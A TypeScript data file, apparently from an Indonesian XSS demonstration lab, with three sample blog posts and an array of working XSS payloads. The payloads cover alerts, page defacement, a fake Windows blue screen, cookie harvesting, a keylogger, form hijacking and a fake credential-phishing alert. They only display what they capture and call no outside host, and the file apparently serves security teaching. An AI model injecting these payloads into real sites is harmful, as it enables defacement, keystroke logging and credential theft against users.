import { Article } from "./types";

export const BLOG_POSTS: Article[] = [
  {
    id: 1,
    title: "Memahami Dasar Keamanan Web",
    excerpt:
      "Keamanan web adalah aspek krusial dalam pengembangan aplikasi modern. Mari kita pelajari konsep dasarnya.",
    content:
      "Dunia teknologi web berkembang sangat cepat, namun tantangan keamanannya tetap ada. Salah satu celah yang paling umum ditemukan adalah Cross-Site Scripting (XSS). XSS memungkinkan penyerang menyisipkan skrip berbahaya ke dalam halaman web yang dilihat oleh pengguna lain. Dalam artikel ini, kita akan membahas mengapa sanitasi input sangat penting bagi setiap pengembang.",
    author: "Budi Santoso",
    category: "Security",
    date: "24 Mei 2024",
    image: "https://picsum.photos/seed/security/800/400",
  },
  {
    id: 2,
    title: "Tips Menulis Kode JavaScript Bersih",
    excerpt:
      "Kode yang bersih bukan hanya soal estetika, tapi juga kemudahan pemeliharaan dan keamanan jangka panjang.",
    content:
      "Clean code adalah filosofi penulisan kode yang memprioritaskan keterbacaan. Dengan menggunakan nama variabel yang deskriptif dan fungsi yang kecil, kita dapat mengurangi potensi bug yang seringkali menjadi pintu masuk bagi eksploitasi keamanan. Pelajari bagaimana standar industri membantu tim besar tetap produktif.",
    author: "Siti Aminah",
    category: "Development",
    date: "22 Mei 2024",
    image: "https://picsum.photos/seed/code/800/400",
  },
  {
    id: 3,
    title: "Evolusi Frontend di Tahun 2024",
    excerpt:
      "Melihat tren terbaru dalam pengembangan antarmuka pengguna, dari framework hingga library utilitas.",
    content:
      "Tahun 2024 membawa banyak perubahan dalam ekosistem frontend. Integrasi AI dalam alat bantu pengkodean dan fokus pada performance menjadi highlight utama. Namun, meskipun teknologi berubah, prinsip dasar seperti validasi data di sisi klien dan server tetap tidak boleh diabaikan.",
    author: "Andi Wijaya",
    category: "Frontend",
    date: "20 Mei 2024",
    image: "https://picsum.photos/seed/tech/800/400",
  },
];

export const XSS_PAYLOADS = [
  // Basic XSS Testing
  {
    category: "Basic XSS",
    label: "Basic Alert",
    payload:
      "alert('🚨 XSS BERHASIL! Sistem telah dikompromisasi!'); alert('💀 Ini adalah demonstrasi serangan XSS!');",
    description: "Alert dasar untuk memverifikasi XSS",
  },
  {
    category: "Basic XSS",
    label: "Popup Storm",
    payload:
      "for(let i=0; i<5; i++) { setTimeout(() => alert('🌪️ XSS Attack #' + (i+1) + ' - Website Compromised!'), i*1000); }",
    description: "Multiple alert popup untuk demonstrasi yang lebih jelas",
  },
  {
    category: "Basic XSS",
    label: "Browser Info Theft",
    payload:
      "alert('🕵️ Browser: ' + navigator.userAgent.split(' ')[0] + '\\n🌐 Platform: ' + navigator.platform + '\\n📍 Language: ' + navigator.language + '\\n💻 Screen: ' + screen.width + 'x' + screen.height);",
    description: "Mengambil informasi browser dan sistem",
  },

  // Defacement Payloads
  {
    category: "Defacement",
    label: "Hacker Theme",
    payload:
      "document.body.style.cssText='background: linear-gradient(45deg, #000, #ff0000, #000) !important; color: #00ff00 !important; font-family: \"Courier New\", monospace !important;'; document.querySelectorAll('*').forEach(el => { if(el !== document.body) el.style.cssText += 'background: rgba(0,0,0,0.8) !important; color: #00ff00 !important; border: 1px solid #ff0000 !important;'; }); alert('💀 HACKER MODE ACTIVATED! 💀');",
    description:
      "Transform seluruh halaman menjadi tema hacker hitam-merah-hijau",
  },
  {
    category: "Defacement",
    label: "Full Page Takeover",
    payload:
      'document.title=\'💀 HACKED BY ETHICAL PENTESTER 💀\'; document.body.innerHTML=\'<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg, black, red, black);color:lime;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Courier New,monospace;z-index:99999;animation:pulse 1s infinite;"><div style="font-size:4rem;text-shadow:0 0 20px lime;margin-bottom:20px;">💀 SYSTEM COMPROMISED 💀</div><div style="font-size:1.5rem;margin-bottom:20px;">Website Telah Diretas!</div><div style="font-size:1rem;margin-bottom:20px;">🔥 XSS Vulnerability Exploited 🔥</div><div style="font-size:0.8rem;color:yellow;">Demo Pentesting - Ethical Hacking Lab</div><button onclick="location.reload()" style="margin-top:20px;background:red;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-size:1rem;">🔄 RESTORE WEBSITE</button></div><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.7}100%{opacity:1}}</style>\';',
    description: "Defacement total dengan tombol restore dan efek visual",
  },
  {
    category: "Defacement",
    label: "Matrix Effect",
    payload:
      'document.body.style.background="black"; alert("🔮 Matrix Mode Activated!"); var matrixDiv = document.createElement("div"); matrixDiv.innerHTML="<div style=\\"position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:#00ff00;font-family:monospace;display:flex;align-items:center;justify-content:center;z-index:9999;font-size:2rem;\\">🔮 MATRIX ACTIVATED 🔮<br><small>Digital Rain Effect</small></div>"; document.body.appendChild(matrixDiv);',
    description: "Efek Matrix dengan kode biner hijau jatuh",
  },
  {
    category: "Defacement",
    label: "Fake BSOD",
    payload:
      'document.body.innerHTML=\'<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0078d4;color:white;font-family:Segoe UI,Helvetica,sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;padding:5%;z-index:9999;"><div style="font-size:8rem;margin-bottom:2rem;">:(</div><div style="font-size:1.5rem;margin-bottom:1rem;">Your PC ran into a problem and needs to restart. We are just collecting some error info, and then we will restart for you.</div><div style="font-size:1rem;margin-bottom:2rem;">0% complete</div><div style="font-size:1rem;margin-bottom:1rem;">For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</div><div style="font-size:1rem;">If you call a support person, give them this info:</div><div style="font-size:1rem;margin-top:1rem;">Stop code: CRITICAL_PROCESS_DIED</div></div>\';',
    description: "Simulasi Blue Screen of Death Windows",
  },
  {
    category: "Defacement",
    label: "Glitch TV",
    payload:
      '<script>document.body.style.cssText="background:black;color:#00ff00;font-family:monospace;overflow:hidden;"; document.body.innerHTML=\'<div style="position:fixed;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px,rgba(0,255,0,0.03) 4px);animation:tvstatic 0.1s linear infinite;z-index:999;"></div><style>@keyframes tvstatic{0%{transform:translateY(0px)}100%{transform:translateY(-10px)}}@keyframes glitch{0%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(-2px,-2px)}60%{transform:translate(2px,2px)}80%{transform:translate(2px,-2px)}100%{transform:translate(0)}}</style><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:3rem;text-align:center;z-index:1000;animation:glitch 0.3s infinite;">📺 SIGNAL HIJACKED 📺<br><span style="font-size:1rem;">WE ARE WATCHING YOU</span></div>\';</script>',
    description: "Efek TV berglitch dengan static dan pesan menakutkan",
  },
  {
    category: "Defacement",
    label: "Fake Loading Hack",
    payload:
      '<script>document.body.innerHTML=\'<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:#00ff00;font-family:Courier New,monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;"><div style="font-size:1.5rem;margin-bottom:2rem;animation:blink 1s infinite;">HACKING IN PROGRESS...</div><div style="width:50%;height:20px;background:#333;margin:20px 0;position:relative;overflow:hidden;"><div id="progress" style="height:100%;background:linear-gradient(90deg,#ff0000,#00ff00);width:0%;animation:loading 8s linear infinite;"></div></div><div style="text-align:center;font-size:0.9rem;"><div>Extracting passwords... ✓</div><div>Bypassing firewall... ✓</div><div>Installing backdoor... ⏳</div><div>Stealing data... ⏳</div></div></div><style>@keyframes loading{0%{width:0%}100%{width:100%}}@keyframes blink{0%,50%{opacity:1}51%,100%{opacity:0}}</style>\';</script>',
    description: "Fake loading screen dengan simulasi proses hacking",
  },
  {
    category: "Defacement",
    label: "Dancing Emoji",
    payload:
      '<script>document.body.style.cssText="background:black;overflow:hidden;"; var emojis=["💀","🔥","⚡","💣","🚨","⚠️"];var container=document.createElement("div");container.style.cssText="position:fixed;width:100%;height:100%;z-index:9999;";document.body.appendChild(container);for(let i=0;i<50;i++){var emoji=document.createElement("div");emoji.innerHTML=emojis[Math.floor(Math.random()*emojis.length)];emoji.style.cssText="position:absolute;font-size:"+(20+Math.random()*40)+"px;left:"+Math.random()*100+"%;top:"+Math.random()*100+"%;animation:dance "+(1+Math.random()*2)+"s infinite;";container.appendChild(emoji);}document.head.insertAdjacentHTML("beforeend","<style>@keyframes dance{0%{transform:rotate(0deg) scale(1)}25%{transform:rotate(90deg) scale(1.2)}50%{transform:rotate(180deg) scale(0.8)}75%{transform:rotate(270deg) scale(1.5)}100%{transform:rotate(360deg) scale(1)}}</style>");</script>',
    description: "Emoji berbahaya yang menari-nari di seluruh layar",
  },
  {
    category: "Defacement",
    label: "Crazy Effects",
    payload:
      'document.body.style.cssText="animation: crazy 0.5s infinite, colorChange 2s infinite !important; transform-origin: center !important;"; document.head.insertAdjacentHTML("beforeend","<style>@keyframes crazy{0%{transform:rotate(0deg) scale(1)}25%{transform:rotate(90deg) scale(1.1)}50%{transform:rotate(180deg) scale(0.9)}75%{transform:rotate(270deg) scale(1.2)}100%{transform:rotate(360deg) scale(1)}}@keyframes colorChange{0%{filter:hue-rotate(0deg)}100%{filter:hue-rotate(360deg)}}*{cursor:url(\\"data:image/svg+xml;utf8,<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"32\\" height=\\"32\\" viewBox=\\"0 0 32 32\\"><text y=\\"24\\" font-size=\\"24\\">💀</text></svg>\\"),auto!important}</style>"); alert("🌪️ WEBSITE DALAM MODE GILA! 🌪️"); setTimeout(() => alert("🎨 Efek Visual Aktif!"), 1000);',
    description: "Efek visual gila dengan rotasi, scaling dan perubahan warna",
  },
  {
    category: "Defacement",
    label: "Shake Screen",
    payload:
      "document.body.style.animation='shake 0.5s infinite'; document.head.insertAdjacentHTML('beforeend','<style>@keyframes shake{0%{transform:translate(1px,1px) rotate(0deg);}10%{transform:translate(-1px,-2px) rotate(-1deg);}20%{transform:translate(-3px,0px) rotate(1deg);}30%{transform:translate(3px,2px) rotate(0deg);}40%{transform:translate(1px,-1px) rotate(1deg);}50%{transform:translate(-1px,2px) rotate(-1deg);}60%{transform:translate(-3px,1px) rotate(0deg);}70%{transform:translate(3px,1px) rotate(-1deg);}80%{transform:translate(-1px,-1px) rotate(1deg);}90%{transform:translate(1px,2px) rotate(0deg);}100%{transform:translate(1px,-2px) rotate(-1deg);}}'); alert('🔥 SCREEN COMPROMISED! 🔥');",
    description: "Membuat layar bergetar dengan efek gempa",
  },

  // Advanced Exploitation
  {
    category: "Advanced",
    label: "Data Harvester",
    payload:
      "let info = '🕵️ SYSTEM COMPROMISED!\\n\\n'; info += '🍪 Cookies: ' + (document.cookie || 'None') + '\\n'; info += '📍 URL: ' + window.location.href + '\\n'; info += '🌐 Domain: ' + document.domain + '\\n'; info += '📋 Title: ' + document.title + '\\n'; info += '🔗 Referrer: ' + (document.referrer || 'Direct') + '\\n'; info += '💻 User Agent: ' + navigator.userAgent + '\\n'; info += '📱 Platform: ' + navigator.platform + '\\n'; alert(info); console.log('HARVESTED DATA:', info);",
    description: "Mengambil berbagai informasi sistem dan halaman web",
  },
  {
    category: "Advanced",
    label: "Advanced Keylogger",
    payload:
      "let keys=''; let keyCount=0; document.addEventListener('keydown', function(e){keys+=e.key; keyCount++; console.log('KEYSTROKE #'+keyCount+':', e.key); if(keyCount % 10 === 0){alert('⌨️ KEYLOGGER ACTIVE!\\n\\nCaptured '+keyCount+' keystrokes\\nLast 20: ' + keys.slice(-20)); } if(keys.length > 50){keys = keys.slice(-50);}}); alert('🎯 ADVANCED KEYLOGGER INSTALLED!\\n\\n⌨️ Every 10 keystrokes will be reported\\n🕵️ All keys are being monitored\\n\\nStart typing to see it in action...');",
    description: "Keylogger advanced dengan counter dan pelaporan berkala",
  },
  {
    category: "Advanced",
    label: "Form Hijack",
    payload:
      "document.querySelectorAll('form').forEach(form => { form.addEventListener('submit', function(e) { e.preventDefault(); alert('🎯 FORM HIJACKED! Data yang akan dikirim telah dicegat!'); }); }); alert('🎯 Form hijack activated!');",
    description: "Membajak semua form di halaman",
  },

  // Social Engineering
  {
    category: "Social Engineering",
    label: "Fake Security Alert",
    payload:
      'document.body.innerHTML=\'<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.95);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;"><div style="background:white;padding:30px;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,0.3);max-width:500px;text-align:center;border:3px solid red;"><div style="color:red;font-size:3rem;margin-bottom:20px;">⚠️</div><h2 style="color:red;margin-bottom:20px;font-size:1.5rem;">PERINGATAN KEAMANAN!</h2><p style="margin-bottom:20px;line-height:1.6;">Sistem mendeteksi aktivitas mencurigakan pada akun Anda. Segera verifikasi identitas untuk mencegah pemblokiran akun.</p><input type="text" placeholder="Username / Email" style="display:block;width:90%;margin:10px auto;padding:12px;border:2px solid #ddd;border-radius:5px;font-size:14px;"><input type="password" placeholder="Password" style="display:block;width:90%;margin:10px auto;padding:12px;border:2px solid #ddd;border-radius:5px;font-size:14px;"><button onclick="alert(\\"🎯 PHISHING BERHASIL!\\\\n\\\\n📧 Email: \\" + document.querySelectorAll(\'input\')[0].value + \\"\\\\n🔑 Password: \\" + document.querySelectorAll(\'input\')[1].value + \\"\\\\n\\\\n⚠️ JANGAN PERNAH MASUKKAN DATA ASLI!\\\\nIni hanya demonstrasi phishing untuk edukasi.\\")" style="background:red;color:white;padding:12px 30px;border:none;border-radius:5px;cursor:pointer;font-size:16px;font-weight:bold;margin-top:10px;">VERIFIKASI SEKARANG</button><div style="margin-top:15px;font-size:12px;color:#666;">Waktu tersisa: <span id=\"timer\">05:00</span></div></div></div><script>let time=300;setInterval(()=>{time--;let min=Math.floor(time/60);let sec=time%60;document.getElementById(\"timer\").innerHTML=min.toString().padStart(2,\"0\")+\":\"+sec.toString().padStart(2,\"0\");if(time<=0)time=300;},1000);</script>\';',
    description: "Fake security alert dengan timer untuk meningkatkan urgency",
  },
];
